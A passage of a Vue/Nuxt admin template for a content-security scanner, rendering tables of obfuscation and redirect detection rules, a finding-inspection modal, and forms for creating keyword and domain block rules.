                <RotateCcw class="w-3.5 h-3.5" />
              </UiButton>
            </div>
          </div>
        </div>

        <!-- Table Container with Loading & Error States -->
        <div class="relative">
          <!-- Loading State Overlay -->
          <div 
            v-if="isObfuscationLoading" 
            class="p-12 bg-card/80 backdrop-blur-xs border border-border rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
          >
            <Loader2 class="w-6 h-6 animate-spin text-primary" />
            <p class="text-xs font-semibold text-muted-foreground">Loading obfuscation rules...</p>
          </div>

          <!-- Error State -->
          <div 
            v-else-if="obfuscationError" 
            class="p-8 bg-rose-500/10 border border-rose-500/30 rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
          >
            <AlertOctagon class="w-8 h-8 text-rose-500" />
            <div class="space-y-1">
              <p class="text-sm font-bold text-foreground">Failed to Load Obfuscation Rules</p>
              <p class="text-xs text-rose-600 dark:text-rose-400">{{ obfuscationError }}</p>
            </div>
            <UiButton size="sm" variant="outline" @click="fetchObfuscationRules" class="border-rose-500/40 hover:bg-rose-500/10">
              <RefreshCw class="w-3.5 h-3.5 mr-1.5" />
              <span>Retry</span>
            </UiButton>
          </div>

          <!-- Real Data Table -->
          <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
            <UiTable 
              :data="obfuscationRulesData" 
              :columns="obfuscationRuleColumns"
              empty-message="No obfuscation rules match your filters."
            >
              <!-- Pattern Cell -->
              <template #cell-pattern="{ item }">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ item.pattern }}
                </span>
              </template>

              <!-- Category Cell -->
              <template #cell-category="{ item }">
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ item.category }}
                </span>
              </template>

              <!-- Severity Cell -->
              <template #cell-severity="{ item }">
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                  {{ item.severity }}
                </span>
              </template>

              <!-- Enabled Cell -->
              <template #cell-is_enabled="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_enabled 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                </span>
              </template>

              <!-- Active Cell -->
              <template #cell-is_active="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_active 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                </span>
              </template>

              <!-- Created At Cell -->
              <template #cell-created_at="{ item }">
                <span class="text-xs text-muted-foreground font-mono">
                  {{ formatDate(item.created_at) }}
                </span>
              </template>

              <!-- Actions Cell -->
              <template #cell-actions="{ item }">
                <div class="flex items-center justify-end gap-1.5">
                  <button 
                    v-if="canViewObfuscation"
                    @click.stop="openObfuscationViewModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="View obfuscation rule details"
                    aria-label="View obfuscation rule details"
                  >
                    <Eye class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canEditObfuscationRule"
                    @click.stop="openEditObfuscationRuleModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="Edit obfuscation rule"
                    aria-label="Edit obfuscation rule"
                  >
                    <Edit3 class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canDeleteObfuscationRule"
                    @click.stop="openDeleteObfuscationRuleModal(item)"
                    class="p-1.5 rounded-lg text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors cursor-pointer"
                    title="Delete obfuscation rule"
                    aria-label="Delete obfuscation rule"
                  >
                    <Trash2 class="w-4 h-4" />
                  </button>
                </div>
              </template>
            </UiTable>

            <!-- Pagination Controls -->
            <UiPagination 
              v-if="obfuscationRulesCount > 0"
              :current-page="obfuscationPage"
              :total-pages="obfuscationRulesPages"
              :total-count="obfuscationRulesCount"
              :items-per-page="obfuscationPageSize"
              item-label="obfuscation rules"
              @update:current-page="obfuscationPage = $event"
            />
          </div>
        </div>
      </div>

      <!-- Redirect Rules Subtab Specific Filters & Table -->
      <div v-else-if="rulesSubTab === 'redirects'" class="space-y-4">
        <!-- Permission Alert -->
        <div v-if="!canViewRedirects" class="p-6 bg-card border border-border rounded-2xl flex flex-col items-center justify-center gap-3 text-center">
          <ShieldAlert class="w-8 h-8 text-amber-500" />
          <div class="space-y-1">
            <p class="text-sm font-bold text-foreground">Access Restricted</p>
            <p class="text-xs text-muted-foreground">You do not have permission to view redirect detection rules.</p>
          </div>
        </div>

        <div v-else class="space-y-4">
          <!-- Redirect Rules Filters Toolbar -->
          <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
            <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
              <!-- Search Box -->
              <div class="relative flex-1">
                <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
                <input 
                  v-model="redirectSearchQuery"
                  type="text" 
                  placeholder="Search redirect patterns..." 
                  class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
                />
                <button 
                  v-if="redirectSearchQuery" 
                  @click="redirectSearchQuery = ''"
                  class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                >
                  <X class="w-3.5 h-3.5" />
                </button>
              </div>

              <!-- Filters Dropdowns Row -->
              <div class="flex items-center gap-2 flex-wrap lg:flex-nowrap">
                <!-- Category Filter -->
                <select 
                  v-model="redirectCategory"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Categories</option>
                  <option value="ADULT">Adult</option>
                  <option value="DRUG">Drug</option>
                  <option value="GAMBLING">Gambling</option>
                  <option value="HIDDEN_CONTENT">Hidden Content</option>
                  <option value="INJECTION">Injection</option>
                  <option value="MALWARE">Malware</option>
                  <option value="OBFUSCATION">Obfuscation</option>
                  <option value="PHISHING">Phishing</option>
                  <option value="REDIRECT">Redirect</option>
                  <option value="SCAM">Scam</option>
                  <option value="SPAM">Spam</option>
                </select>

                <!-- Severity Filter -->
                <select 
                  v-model="redirectSeverity"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Severities</option>
                  <option value="CRITICAL">Critical</option>
                  <option value="HIGH">High</option>
                  <option value="MEDIUM">Medium</option>
                  <option value="LOW">Low</option>
                  <option value="INFO">Info</option>
                </select>

                <!-- Active Filter -->
                <select 
                  v-model="redirectIsActive"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Active Status</option>
                  <option value="true">Active Only</option>
                  <option value="false">Inactive Only</option>
                </select>

                <!-- Enabled Filter -->
                <select 
                  v-model="redirectIsEnabled"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="all">All Enabled Status</option>
                  <option value="true">Enabled Only</option>
                  <option value="false">Disabled Only</option>
                </select>

                <!-- Ordering Filter -->
                <select 
                  v-model="redirectOrdering"
                  class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option value="-created_at">Newest First</option>
                  <option value="created_at">Oldest First</option>
                  <option value="pattern">Pattern (A-Z)</option>
                  <option value="-pattern">Pattern (Z-A)</option>
                </select>

                <!-- Page Size Selector -->
                <div class="flex items-center gap-1.5 border-l border-border pl-2">
                  <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                  <select 
                    v-model.number="redirectPageSize"
                    class="h-9 px-2 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                  >
                    <option :value="5">5 / page</option>
                    <option :value="10">10 / page</option>
                    <option :value="25">25 / page</option>
                    <option :value="50">50 / page</option>
                    <option :value="100">100 / page</option>
                  </select>
                </div>

                <!-- Reset Filters Button -->
                <UiButton 
                  variant="ghost" 
                  size="sm" 
                  @click="resetRedirectFilters" 
                  class="h-9 px-2.5 text-xs text-muted-foreground hover:text-foreground"
                  title="Reset filters"
                >
                  <RotateCcw class="w-3.5 h-3.5" />
                </UiButton>
              </div>
            </div>
          </div>

          <!-- Table Container with Loading & Error States -->
          <div class="relative">
            <!-- Loading State Overlay -->
            <div 
              v-if="isRedirectsLoading" 
              class="p-12 bg-card/80 backdrop-blur-xs border border-border rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
            >
              <Loader2 class="w-6 h-6 animate-spin text-primary" />
              <p class="text-xs font-semibold text-muted-foreground">Loading redirect rules...</p>
            </div>

            <!-- Error State -->
            <div 
              v-else-if="redirectsError" 
              class="p-8 bg-rose-500/10 border border-rose-500/30 rounded-2xl flex flex-col items-center justify-center gap-3 text-center"
            >
              <AlertOctagon class="w-8 h-8 text-rose-500" />
              <div class="space-y-1">
                <p class="text-sm font-bold text-foreground">Failed to Load Redirect Rules</p>
                <p class="text-xs text-rose-600 dark:text-rose-400">{{ redirectsError }}</p>
              </div>
              <UiButton size="sm" variant="outline" @click="fetchRedirectRules" class="border-rose-500/40 hover:bg-rose-500/10">
                <RefreshCw class="w-3.5 h-3.5 mr-1.5" />
                <span>Retry</span>
              </UiButton>
            </div>

            <!-- Real Data Table -->
            <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
              <UiTable 
                :data="redirectRulesData" 
                :columns="redirectRuleColumns"
                empty-message="No redirect rules match your filters."
              >
                <!-- Pattern Cell -->
                <template #cell-pattern="{ item }">
                  <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                    {{ item.pattern }}
                  </span>
                </template>

                <!-- Category Cell -->
                <template #cell-category="{ item }">
                  <span class="text-xs font-semibold text-muted-foreground">
                    {{ item.category }}
                  </span>
                </template>

                <!-- Severity Cell -->
                <template #cell-severity="{ item }">
                  <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                    {{ item.severity }}
                  </span>
                </template>

                <!-- Enabled Cell -->
                <template #cell-is_enabled="{ item }">
                  <span 
                    :class="cn(
                      'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                      item.is_enabled 
                        ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                        : 'bg-muted text-muted-foreground border-border'
                    )"
                  >
                    <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                    <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                  </span>
                </template>

                <!-- Active Cell -->
                <template #cell-is_active="{ item }">
                  <span 
                    :class="cn(
                      'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                      item.is_active 
                        ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                        : 'bg-muted text-muted-foreground border-border'
                    )"
                  >
                    <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                    <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                  </span>
                </template>

                <!-- Created At Cell -->
                <template #cell-created_at="{ item }">
                  <span class="text-xs text-muted-foreground font-mono">
                    {{ formatDate(item.created_at) }}
                  </span>
                </template>
              </UiTable>

              <!-- Pagination Controls -->
              <UiPagination 
                v-if="redirectRulesCount > 0"
                :current-page="redirectPage"
                :total-pages="redirectRulesPages"
                :total-count="redirectRulesCount"
                :items-per-page="redirectPageSize"
                item-label="redirect rules"
                @update:current-page="redirectPage = $event"
              />
            </div>
          </div>
        </div>
      </div>

      <!-- Non-Keywords/Non-Domains Rules (HTML, Attributes) original fallback -->
      <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
        <div class="divide-y divide-border">
          <div 
            v-for="rule in filteredRules" 
            :key="rule.id"
            class="p-4 sm:p-5 flex flex-col sm:flex-row sm:items-center justify-between gap-4 hover:bg-muted/20 transition-colors"
          >
            <div class="space-y-1 min-w-0">
              <div class="flex items-center gap-2.5 flex-wrap">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ rule.pattern }}
                </span>
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(rule.severity))">
                  {{ rule.severity }}
                </span>
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ rule.category }}
                </span>
              </div>
              <p class="text-xs text-muted-foreground leading-relaxed">
                {{ rule.description }}
              </p>
              <div class="flex items-center gap-3 text-[11px] text-muted-foreground font-mono pt-1">
                <span>Rule ID: {{ rule.id }}</span>
                <span>•</span>
                <span>Matches Caught: <strong class="text-foreground">{{ rule.matchCount }}</strong></span>
                <span>•</span>
                <span>Updated: {{ rule.updatedAt }}</span>
              </div>
            </div>

            <!-- Rule Actions -->
            <div class="flex items-center gap-2 shrink-0 pt-2 sm:pt-0 border-t sm:border-t-0 border-border/50 justify-between sm:justify-end">
              <!-- Enable / Disable Switch -->
              <button 
                @click="toggleRuleStatus(rule)"
                :class="cn(
                  'px-3 py-1.5 rounded-xl text-xs font-bold border transition-colors flex items-center gap-1.5 cursor-pointer',
                  rule.enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
                :title="rule.enabled ? 'Click to disable' : 'Click to enable'"
              >
                <div :class="cn('w-2 h-2 rounded-full', rule.enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></div>
                <span>{{ rule.enabled ? 'Active' : 'Disabled' }}</span>
              </button>

              <button 
                @click="openEditRuleModal(rule)"
                class="p-2 rounded-xl text-muted-foreground hover:text-foreground hover:bg-muted transition-colors"
                title="Edit rule"
              >
                <Edit3 class="w-4 h-4" />
              </button>

              <button 
                @click="deleteRule(rule)"
                class="p-2 rounded-xl text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors"
                title="Delete rule"
              >
                <Trash2 class="w-4 h-4" />
              </button>
            </div>
          </div>

          <div v-if="filteredRules.length === 0" class="p-8 text-center text-muted-foreground space-y-2">
            <Code2 class="w-8 h-8 mx-auto text-muted-foreground/50" />
            <p class="text-sm font-semibold">No rules configured in this section.</p>
            <p class="text-xs">Click the Add Rule button above to create one.</p>
          </div>
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- MODAL: FINDING DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isDetailModalOpen"
      :title="`Security Inspection: ${selectedFinding?.id || ''}`"
      :subtitle="`${selectedFinding?.contentType} Content Payload Analysis`"
      max-width="max-w-3xl"
      @close="closeFindingDetail"
    >
      <div v-if="selectedFinding" class="p-6 space-y-6 overflow-y-auto max-h-[75vh]">
        <!-- Overview Banner -->
        <div class="bg-muted/40 border border-border rounded-2xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div class="space-y-1 min-w-0">
            <div class="flex items-center gap-2">
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border',
                  selectedFinding.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 border-rose-500/30' :
                  selectedFinding.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 border-orange-500/30' :
                  selectedFinding.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 border-amber-500/30' : 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30'
                )"
              >
                {{ selectedFinding.status }}
              </span>
              <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedFinding.severity))">
                {{ selectedFinding.severity }} Severity
              </span>
            </div>
            <h3 class="text-base font-bold text-foreground truncate">
              {{ selectedFinding.contentName }}
            </h3>
            <p class="text-xs text-muted-foreground font-mono">
              Target Field: <strong class="text-foreground">{{ selectedFinding.field }}</strong> (Line ~{{ selectedFinding.lineOffset }})
            </p>
          </div>

          <div class="flex sm:flex-col items-center sm:items-end justify-between gap-1 shrink-0 bg-card p-3 rounded-xl border border-border">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Threat Score</span>
            <span 
              :class="cn(
                'text-2xl font-display font-extrabold font-mono',
                selectedFinding.riskScore >= 80 ? 'text-rose-600 dark:text-rose-400' :
                selectedFinding.riskScore >= 50 ? 'text-amber-600 dark:text-amber-400' : 'text-emerald-600 dark:text-emerald-400'
              )"
            >
              {{ selectedFinding.riskScore }}<span class="text-xs text-muted-foreground font-normal">/100</span>
            </span>
          </div>
        </div>

        <!-- Detection Assessment -->
        <div class="space-y-2">
          <h4 class="text-xs font-bold uppercase tracking-wider text-muted-foreground">
            Detection Assessment
          </h4>
          <div class="bg-card border border-border rounded-xl p-4 space-y-2">
            <div class="flex items-center justify-between text-xs font-semibold">
              <span class="text-muted-foreground">Detector Engine:</span>
              <span class="text-foreground font-bold">{{ selectedFinding.detector }} Detector</span>
            </div>
            <div class="flex items-center justify-between text-xs font-semibold">
              <span class="text-muted-foreground">Triggered Rule:</span>
              <span class="text-foreground font-mono text-[11px] bg-muted px-2 py-0.5 rounded">{{ selectedFinding.ruleName }}</span>
            </div>
            <div class="flex items-center justify-between text-xs font-semibold">
              <span class="text-muted-foreground">Inspection Timestamp:</span>
              <span class="text-muted-foreground font-mono text-[11px]">{{ selectedFinding.scannedAt }}</span>
            </div>
            <p class="text-xs text-foreground font-medium pt-2 border-t border-border/60">
              {{ selectedFinding.description }}
            </p>
          </div>
        </div>

        <!-- Content Context Snippet with Highlight -->
        <div class="space-y-2">
          <div class="flex items-center justify-between">
            <h4 class="text-xs font-bold uppercase tracking-wider text-muted-foreground">
              Code & Content Context Snippet
            </h4>
            <span class="text-[10px] font-mono text-muted-foreground">
              Offset line {{ selectedFinding.lineOffset }}
            </span>
          </div>
          
          <div class="bg-slate-950 text-slate-100 rounded-xl p-4 font-mono text-xs leading-relaxed border border-slate-800 overflow-x-auto">
            <span class="text-slate-400">{{ selectedFinding.contextSnippetBefore }}</span>
            <mark class="bg-rose-500/30 text-rose-300 font-bold px-1.5 py-0.5 rounded border border-rose-500/50">
              {{ selectedFinding.contextSnippetMatched }}
            </mark>
            <span class="text-slate-400">{{ selectedFinding.contextSnippetAfter }}</span>
          </div>

          <div class="bg-muted/50 p-3 rounded-xl border border-border flex items-center justify-between text-xs">
            <span class="text-muted-foreground">Flagged String:</span>
            <code class="text-rose-600 dark:text-rose-400 font-bold font-mono text-[11px] truncate max-w-[360px]">
              {{ selectedFinding.matchedValue }}
            </code>
          </div>
        </div>

        <!-- Related Content Navigation Workflow -->
        <div class="space-y-2">
          <h4 class="text-xs font-bold uppercase tracking-wider text-muted-foreground">
            Remediation & Content Navigation
          </h4>
          <div class="bg-card border border-border rounded-xl p-4 space-y-3">
            <div class="flex items-center justify-between text-xs">
              <span class="text-muted-foreground">Target Entity:</span>
              <span class="font-bold text-foreground">{{ selectedFinding.contentName }}</span>
            </div>

            <div class="flex items-center gap-3 pt-2">
              <a 
                :href="selectedFinding.storefrontUrl" 
                target="_blank" 
                class="flex-1 h-9 px-3 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 border border-border transition-colors"
              >
                <ExternalLink class="w-3.5 h-3.5" />
                <span>View on Storefront</span>
              </a>

              <NuxtLink 
                :to="selectedFinding.adminEditUrl"
                class="flex-1 h-9 px-3 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 transition-colors shadow-xs"
              >
                <Edit3 class="w-3.5 h-3.5" />
                <span>Edit in Admin</span>
              </NuxtLink>
            </div>
            
            <p class="text-[11px] text-muted-foreground text-center italic">
              Workflow: Finding → View/Edit Content → Sanitize/Fix → Trigger Rescan
            </p>
          </div>
        </div>

        <!-- Action Controls -->
        <div class="pt-4 border-t border-border flex flex-col sm:flex-row items-center justify-between gap-3">
          <div class="flex items-center gap-2 w-full sm:w-auto">
            <button 
              @click="markFindingAsSafe(selectedFinding)"
              class="flex-1 sm:flex-none h-9 px-3.5 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-600 dark:text-emerald-400 border border-emerald-500/30 rounded-xl text-xs font-bold transition-colors"
            >
              Mark as Safe
            </button>
            <button 
              @click="confirmFindingSuspicious(selectedFinding)"
              class="flex-1 sm:flex-none h-9 px-3.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-600 dark:text-rose-400 border border-rose-500/30 rounded-xl text-xs font-bold transition-colors"
            >
              Confirm Threat
            </button>
          </div>

          <div class="flex items-center gap-2 w-full sm:w-auto justify-end">
            <button 
              @click="rescanFinding(selectedFinding)"
              :disabled="isRescanningItem"
              class="flex-1 sm:flex-none h-9 px-3.5 bg-muted hover:bg-muted/80 text-foreground border border-border rounded-xl text-xs font-bold transition-colors flex items-center justify-center gap-1.5"
            >
              <RotateCcw :class="cn('w-3.5 h-3.5', isRescanningItem && 'animate-spin')" />
              <span>{{ isRescanningItem ? 'Rescanning...' : 'Rescan Entity' }}</span>
            </button>

            <button 
              @click="resolveFinding(selectedFinding)"
              class="flex-1 sm:flex-none h-9 px-4 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl text-xs font-bold transition-colors shadow-xs"
            >
              Resolve Issue
            </button>
          </div>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: ADD / EDIT DETECTION RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isRuleModalOpen"
      :title="editingRule ? `Edit Rule: ${editingRule.id}` : (ruleForm.type === 'keyword' ? 'Create Keyword Rule' : ruleForm.type === 'domain' ? 'Create Domain Rule' : ruleForm.type === 'hidden_content' ? 'Create Hidden Content Rule' : ruleForm.type === 'obfuscation' ? 'Create Obfuscation Rule' : ruleForm.type === 'redirect' ? 'Create Redirect Rule' : 'Create Security Detection Rule')"
      :subtitle="ruleForm.type === 'keyword' && !editingRule ? 'Define keyword pattern heuristics for content security inspection.' : ruleForm.type === 'domain' && !editingRule ? 'Define domain pattern heuristics for content security inspection.' : ruleForm.type === 'hidden_content' && !editingRule ? 'Define CSS declaration pattern heuristics for content security inspection.' : ruleForm.type === 'obfuscation' && !editingRule ? 'Define code obfuscation pattern / regex heuristics for content security inspection.' : ruleForm.type === 'redirect' && !editingRule ? 'Define redirect pattern / heuristic rules for content security inspection.' : 'Define pattern heuristics for automated catalog inspection.'"
      max-width="max-w-lg"
      @close="isRuleModalOpen = false"
    >
      <!-- Keyword Rule Create Form (Real API) -->
      <form v-if="ruleForm.type === 'keyword' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Keyword -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Keyword <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="keywordCreateForm.keyword"
            type="text" 
            placeholder="e.g. free crypto giveaway, telegram @, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Match Type Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Match Type <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordCreateForm.match_type"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="WORD">Word</option>
              <option value="SUBSTRING">Substring</option>
            </select>
          </div>
        </div>

        <!-- Severity -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
          <select 
            v-model="keywordCreateForm.severity"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
          >
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
            <option value="LOW">Low</option>
            <option value="INFO">Info</option>
          </select>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="keywordCreateForm.description"
            rows="2"
            placeholder="Explain why this keyword is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="keywordCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingKeywordRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingKeywordRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingKeywordRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingKeywordRule ? 'Creating...' : 'Create Keyword Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- Domain Rule Create Form (Real API) -->
      <form v-else-if="ruleForm.type === 'domain' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Domain -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Domain <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="domainCreateForm.domain"
            type="text" 
            placeholder="e.g. malicious-site.com, shady-tracker.org"
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Match Type Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="domainCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="GAMBLING">Gambling</option>
              <option value="MALWARE">Malware</option>
              <option value="PHISHING">Phishing</option>
              <option value="SCAM">Scam</option>
              <option value="SPAM">Spam</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Match Type <span class="text-rose-500">*</span></label>
            <select 
              v-model="domainCreateForm.match_type"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="EXACT">Exact Domain</option>
              <option value="SUBDOMAIN">Domain And Subdomains</option>
            </select>
          </div>
        </div>

        <!-- Severity -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
          <select 
            v-model="domainCreateForm.severity"
